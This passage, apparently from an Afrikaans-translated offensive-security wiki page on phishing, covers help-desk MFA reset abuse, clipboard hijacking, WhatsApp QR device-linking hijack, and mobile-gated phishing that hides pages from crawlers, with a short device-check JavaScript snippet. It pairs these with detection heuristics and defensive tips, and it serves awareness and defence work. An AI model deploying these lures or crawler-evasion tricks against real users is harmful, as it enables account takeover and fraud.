[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor vir AzureAD/AWS/Okta-gebeurtenisse waar **`deleteMFA` + `addMFA`** binne minute vanaf dieselfde IP voorkom.



## Clipboard Hijacking / Pastejacking

Aanvallers kan stilweg kwaadwillige opdragte in die slagoffer se klembord kopieer vanaf ’n gekompromitteerde of typosquatted webblad en dan die gebruiker mislei om dit binne **Win + R**, **Win + X** of ’n terminalvenster te plak, wat arbitrêre kode uitvoer sonder enige download of attachment.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* ’n Lokblad (bv. vals ministry/CERT-“channel”) vertoon ’n WhatsApp Web/Desktop QR en gee die slagoffer opdrag om dit te skandeer, wat die aanvaller stilweg as ’n **linked device** byvoeg.
* Die aanvaller kry onmiddellik chat/kontak-sigbaarheid totdat die sessie verwyder word. Slagoffers kan later ’n “new device linked”-kennisgewing sien; verdedigers kan soek vir onverwags device-link-events kort ná besoeke aan onbetroubare QR-bladsye.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operateurs plaas toenemend hul phishing-vloei agter ’n eenvoudige device check sodat desktop crawlers nooit die finale bladsye bereik nie. ’n Algemene patroon is ’n klein script wat toets vir ’n touch-capable DOM en die resultaat na ’n server endpoint stuur; nie‑mobile clients ontvang HTTP 500 (of ’n leë bladsy), terwyl mobile users die volledige vloei kry.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (vereenvoudig):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server-gedrag wat dikwels waargeneem word:
- Stel ’n sessiekoekie tydens die eerste laai.
- Aanvaar `POST /detect {"is_mobile":true|false}`.
- Gee 500 (of ’n plekhouer) terug vir daaropvolgende GETs wanneer `is_mobile=false`; bedien phishing slegs as `true`.

Soek- en opsporingsheuristieke:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web-telemetrie: volgorde van `GET /static/detect_device.js` → `POST /detect` → HTTP 500 vir nie-mobiel; wettige mobiele slagofferpaaie gee 200 terug met opvolgende HTML/JS.
- Blokkeer of ondersoek bladsye wat inhoud uitsluitlik op `ontouchstart` of soortgelyke toestelkontroles voorwaardelik maak.

Verdedigingstips:
- Voer crawlers uit met mobiele-agtige vingerafdrukke en JS geaktiveer om gegrendelde inhoud te ontbloot.
- Stel waarskuwings in vir verdagte 500-antwoorde ná `POST /detect` op nuutgeregistreerde domeine.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
